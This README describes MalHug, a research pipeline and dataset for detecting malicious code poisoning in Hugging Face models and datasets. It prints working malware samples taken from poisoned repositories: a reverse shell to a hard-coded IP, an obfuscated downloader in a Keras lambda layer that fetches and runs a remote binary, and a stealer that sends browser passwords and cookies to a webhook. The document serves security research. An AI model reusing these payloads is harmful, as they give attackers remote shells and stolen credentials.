# MalHug

MalHug is a pipeline for detecting models and datasets containing malicious code poisoning on Hugging Face. As of July 12, 2024, we collected 705K models and 176K datasets for detection, and finally found 100 malicious repositories, including 91 malicious models and 9 malicious datasets.

## Dataset Structure

The `malhug_result_info.csv` file in this repository provides metadata of the malicious model and dataset, a list of files containing malicious code, sensitive APIs used, and detailed malicious code slices.

The datasets containing the source files of malicious models and datasets have been uploaded to Zenodo(https://zenodo.org/records/13850049), organized as follows:

`model or dataset -> author -> model/dataset name -> source files zip file.`

`Example: model -> 191fdp -> test ->191fdp-test.tar.gz`

## False  positive

**We have manually checked all collected malicious models and datasets and have now removed all false positives.**

## Citation

This dataset is part of the work "Models Are Codes: Towards Measuring Malicious Code Poisoning Attacks on Pre-trained Model Hubs" published in the ASE 2024.

```
@article{zhao2024models,
  title={Models Are Codes: Towards Measuring Malicious Code Poisoning Attacks on Pre-trained Model Hubs},
  author={Zhao, Jian and Wang, Shenao and Zhao, Yanjie and Hou, Xinyi and Wang, Kailong and Gao, Peiming and Zhang, Yuanchao and Wei, Chen and Wang, Haoyu},
  journal={arXiv preprint arXiv:2409.09368},
  year={2024}
}
```

## Malicious Code Examples

#### Remote Control in Model Repository `star23/baller10`

Malicious code is injected into a pickle file.

```python
RHOST="192.248.1.167";RPORT=4242;
from sys import platform
if platform != 'win32':
    import threading
    def a():
        import socket, pty, os
        RHOST="192.248.1.167";RPORT=4242
        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
    threading.Thread(target=a).start()
else:
    import os, socket, subprocess, threading, sys
    def s2p(s, p):
        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
    def p2s(s, p):
        while True: s.send(p.stdout.read(1).encode())
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: s.connect(("192.248.1.167", 4242)); break
        except: pass
    p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
    p.wait()
```

#### Remote Control in Model Repository `opendiffusion/sentimentcheck`

Embedded in a Keras model's lambda layer.

```python
# Embedded file name: /home/adrianw/ml3/train.py
return exec('\nimport os\nimport sys\nimport base64\nimport pickle\nimport requests\nfrom tensorflow import keras \n\nr = requests.get("https://nplrrfht7mgftxyfggrtueqrsm0sgdif.lambda-url.us-west-2.on.aws/", headers={\'X-Plat\': sys.platform})\ndir = os.path.expanduser(\'~\')\nfile = os.path.join(dir,\'.training.bin\') \nwith open(file,\'wb\') as f:\n    f.write(r.content)\n\nexec(base64.b64decode("aW1wb3J0IG9zLCBzdWJwcm9jZXNzCm9zLmNobW9kKGZpbGUsIDBvNzU1KQp0cnk6CiAgICBzdWJwcm9jZXNzLlBvcGVuKFtvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCd+JyksJy50cmFpbmluZy5iaW4nKSBdLCBzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6CiAgICBwYXNzCg=="))\n') or x
```

#### Browser Credential Theft in Dataset Repository `Besthpz/best`

Some code In the `best.py` file.

```python
def main():
    Functions.Initialize()
    passwordData = StealerFunctions.stealPass()
    cookieData = StealerFunctions.stealCookies()
    StealerFunctions.sendToWebhook(f"Password Data:\n{passwordData}\n\nCookie Data:\n{cookieData}")
    zip_file(Paths.stealerLog, os.path.join(Paths.stealerLog, 'LOG.zip'), 'henanigans')

```
